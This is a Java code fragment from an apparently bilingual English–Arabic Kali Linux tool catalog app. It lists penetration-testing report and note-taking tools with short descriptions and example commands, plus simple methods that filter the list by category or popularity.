        addT(tools, "cherrytree", "CherryTree", "Note taking", "تدوين ملاحظات", "report", "cherrytree", "cherrytree", false);
        addT(tools, "keepnote", "KeepNote", "Note taking", "تدوين ملاحظات", "report", "keepnote", "keepnote", false);
        addT(tools, "maltego-te", "Maltego CE", "Graph link analysis", "تحليل روابط", "report", "maltego", "maltego", false);
        addT(tools, "dradis", "Dradis", "Collaboration framework", "إطار تعاون", "report", "dradis", "dradis", false);
        addT(tools, "faraday", "Faraday", "Pentest IDE", "بيئة اختبار اختراق", "report", "faraday", "faraday", false);
        addT(tools, "pipal", "Pipal", "Password analyzer", "محلل كلمات مرور", "report", "pipal", "pipal passwords.txt", false);
        addT(tools, "metasploit-report", "MSF Reports", "MSF report generator", "مولّد تقارير MSF", "report", "msfconsole", "msfconsole -q -x 'generate_report'", false);
        addT(tools, "nmap-report", "Nmap Report", "Nmap XML report", "تقرير XML لـ Nmap", "report", "nmap", "nmap -oX report.xml target.com", false);

        return tools;
    }

    private static void addT(List<KaliTool> list, String name, String nameAr,
            String desc, String descAr, String cat, String cmd, String ex, boolean popular) {
        list.add(new KaliTool(name, nameAr, desc, descAr, cat, cmd, ex, popular));
    }

    public static List<KaliTool> getByCategory(String category) {
        List<KaliTool> all = getAllTools();
        List<KaliTool> filtered = new ArrayList<>();
        for (KaliTool t : all) {
            if (t.category.equals(category)) filtered.add(t);
        }
        return filtered;
    }

    public static List<KaliTool> getPopular() {
        List<KaliTool> all = getAllTools();
        List<KaliTool> popular = new ArrayList<>();
        for (KaliTool t : all) {
            if (t.popular) popular.add(t);
        }
        return popular;
    }

    public static int getTotalCount() {
        return getAllTools().size();
    }
}
